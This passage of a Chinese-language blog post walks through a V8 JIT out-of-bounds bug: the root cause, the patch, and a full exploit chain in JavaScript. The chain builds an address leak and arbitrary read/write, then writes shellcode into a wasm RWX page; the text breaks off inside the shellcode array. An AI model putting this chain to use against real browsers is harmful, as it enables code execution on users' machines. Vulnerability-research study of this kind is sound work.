  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8.91238232205e-313</span><span class="token punctuation">;</span>  <span class="token comment">// 0x2a00000000</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">;</span>
<span class="token keyword">var</span> a3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">2.2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
a3<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0x11000</span><span class="token punctuation">;</span>
a3<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">3.3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> a4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a4<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>fun<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a4<span class="token punctuation">)</span><span class="token punctuation">;</span>
res <span class="token operator">=</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a2<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>可以看到，a2 数组的长度从 16 变成了 42(0x2a)，且从 <code>a2[16]</code> 往后的数值都不是 undefined，很明显出现了数组越界<br><img src="/images/696ac724/pasted-2.png" alt="upload successful"></p>
<p>稍加调试，就可以发现问题出现在这里：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8.91238232205e-313</span><span class="token punctuation">;</span>  <span class="token comment">// 0x2a00000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这里造成了越界写操作，把 a2 的 length 给改写了，但实际上对数组越界写的情况是会导致数组扩容的，经过了解，这是因为 JIT 优化把越界的一些检查去掉了，导致漏洞的产生</p>
<p>可以看看漏洞修复的 diff ：<br><img src="/images/696ac724/pasted-3.png" alt="upload successful"></p>
<p>修复前，函数参数的长度类型是 <code>Type::Range(0.0, Code::kMaxArguments, zone());</code></p>
<p><code>Code::kMaxArguments</code> 的值是 65534，表示函数支持的最大参数数量是 65534，但是后来函数参数支持更多了，这里确没有更改，Poc 中使用了右移 16 位的操作符，65534 右移 16 位必定是 0，所以 JIT 认为这一计算始终是 0，于是进行了优化，把一些越界检查给去掉了，因此造成了越界读写的漏洞</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>只要改写 a2 的 length 字段很大的值，那么 a2 数组可以越界的范围很大，漏洞利用起来也很简单</p>
<ol>
<li>先利用数组越界读写泄露对象的地址</li>
<li>再利用越界读写构造任意地址读写</li>
<li>结合 1, 2 可以 leak 出 wasm 的 RWX 段位置，再任意写注入 shellcode </li>
</ol>
<p>先仿照 Poc 将 a2 的 length 改成很大的值，如 0xffff：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> x <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
  a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
  a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">;</span>
<span class="token keyword">var</span> a3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span><span class="token number">2.2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
a3<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0x11000</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//%OptimizeFunctionOnNextCall(fun);</span>

<span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中的 <code>%OptimizeFunctionOnNextCall(fun)</code> 其实让 JIT 优化 <code>fun</code> 函数，其实可以用多次循环调用 <code>fun</code> 函数来替代</p>
<p>这里为了方便后续的使用，还写了 BigInt 与 Float 类型的互相转换函数：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> fi_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>fi_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> i_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>fi_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">f2i</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        f_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
        <span class="token keyword">return</span> i_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        i_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
        <span class="token keyword">return</span> f_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>







<h3 id="泄露对象地址"><a href="#泄露对象地址" class="headerlink" title="泄露对象地址"></a>泄露对象地址</h3><p>先定义一个对象 <code>objLeak</code>，有 <code>tag</code> 和 <code>leak</code> 属性，利用越界读，找到 <code>tag</code> 属性值 0x4567 相对于数组 a2 偏移的索引，即可得到 <code>leak</code> 属性对应的索引 <code>offset_leak</code>，再通过 <code>a2[offset_leak]</code> 即可将 <code>leak</code> 属性的 float 值读出来，只要往 <code>leak</code> 属性放入任意的对象，即可读出任意对象的地址</p>
<p>代码如下：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> objLeak <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'leak'</span><span class="token operator">:</span> <span class="token number">0x1234</span><span class="token punctuation">,</span> <span class="token string">'tag'</span><span class="token operator">:</span> <span class="token number">0x4567</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> offset_leak <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xffff</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">f2i</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x456700000000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                offset_leak <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'offset_leak = '</span> <span class="token operator">+</span> offset_leak<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">addressOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        objLeak<span class="token punctuation">.</span>leak <span class="token operator">=</span> obj<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>offset_leak<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">var</span> objTest <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'aaa'</span><span class="token operator">:</span> <span class="token number">123</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'addressOf(objTest) = 0x'</span> <span class="token operator">+</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面还用了 <code>objTest</code> 对象来测试 <code>addressOf</code>，调试结果如下：<br><img src="/images/696ac724/pasted-4.png" alt="upload successful"></p>
<h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><p>任意地址读写其实也很简单，可以先定义一个 ArrayBuffer 对象，改写它的 backing_store 指针，就可以对指向的地方任意读写</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> buf2write <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0xbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buf2write<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> offset_backing_store <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>buf2write<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调试可以看到，ArrayBuffer 的 length 字段是指定的 0xbeef，用同样的方式，找到 0xbeef 即可找到对应在 a2 数组的索引，随之即可找到 backing_store 指针的位置<br><img src="/images/696ac724/pasted-5.png" alt="upload successful"></p>
<p>代码如下：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> buf2write <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0xbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buf2write<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> offset_backing_store <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>buf2write<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xffff</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">f2i</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xbeef</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                offset_backing_store <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>



<span class="token keyword">function</span> <span class="token function">write64</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        a2<span class="token punctuation">[</span>offset_backing_store<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        a2<span class="token punctuation">[</span>offset_backing_store<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>data_view<span class="token punctuation">.</span><span class="token function">getFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">write64</span><span class="token punctuation">(</span><span class="token function">addressOf</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x18n</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">,</span> <span class="token number">0x2333n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'value = 0x'</span> <span class="token operator">+</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token function">addressOf</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x18n</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调试测试一下，这是 ArrayBuffer 修改前：<br><img src="/images/696ac724/pasted-7.png" alt="upload successful"></p>
<p>然后看到 objTest 被改写了：<br><img src="/images/696ac724/pasted-8.png" alt="upload successful"></p>
<p><img src="/images/696ac724/pasted-9.png" alt="upload successful"></p>
<p>ArrayBuffer 也同预期那样，backing_store 指针被改写了：<br><img src="/images/696ac724/pasted-10.png" alt="upload successful"></p>
<h3 id="利用-wasm-执行-shellcode"><a href="#利用-wasm-执行-shellcode" class="headerlink" title="利用 wasm 执行 shellcode"></a>利用 wasm 执行 shellcode</h3><p>大致按照下面的路线找到 RWX 段的地址，然后注入 shellcode 就行</p>
<pre class="line-numbers language-none"><code class="language-none">wasmInstance.exports.main -&gt; shared_info -&gt; data -&gt; instance -&gt; rwx_page<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<p>先构造一个 wasm 对象</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> wasmModule <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasmCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasmInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>wasmModule<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f <span class="token operator">=</span> wasmInstance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对象 shared_info 的地址在对象 f 的 +0x18 偏移处：<br><img src="/images/696ac724/pasted-11.png" alt="upload successful"></p>
<p>对象 data 的地址在 shared_info 的 +0x8 偏移处：<br><img src="/images/696ac724/pasted-12.png" alt="upload successful"></p>
<p>在 data 偏移 +0x10 处找到 instance 对象的地址：<br><img src="/images/696ac724/pasted-13.png" alt="upload successful"></p>
<p>在 instance+0xe8 处找到 RWX 段的地址：<br><img src="/images/696ac724/pasted-14.png" alt="upload successful"></p>
<p><img src="/images/696ac724/pasted-15.png" alt="upload successful"></p>
<p>找 RWX 段的过程也可以参照本人之前写的 <a href="/3b546c3b">starctf oob 复现</a> 的文章</p>
<p>写入 shellcode：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> f_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> shared_info_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>f_addr <span class="token operator">+</span> <span class="token number">0x18n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>shared_info_addr <span class="token operator">+</span> <span class="token number">0x8n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> instance_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> rwx_page_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>instance_addr <span class="token operator">+</span> <span class="token number">0xe8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">var</span> sc_arr <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0x10101010101b848n</span><span class="token punctuation">,</span>    <span class="token number">0x62792eb848500101n</span><span class="token punctuation">,</span>    <span class="token number">0x431480101626d60n</span><span class="token punctuation">,</span>    <span class="token number">0x2f7273752fb84824n</span><span class="token punctuation">,</span>
    <span class="token number">0x48e78948506e6962n</span><span class="token punctuation">,</span>    <span class="token number">0x1010101010101b8n</span><span class="token punctuation">,</span>    <span class="token number">0x6d606279b8485001n</span><span class="token punctuation">,</span>    <span class="token number">0x2404314801010162n</span><span class="token punctuation">,</span>
    <span class="token number">0x1485e086a56f631n</span><span class="token punctuation">,</span>    <span class="token number">0x313b68e6894856e6n</span><span class="token punctuation">,</span>    <span class="token number">0x101012434810101n</span><span class="token punctuation">,</span>    <span class="token number">0x4c50534944b84801n</span><span class="token punctuation">,</span>
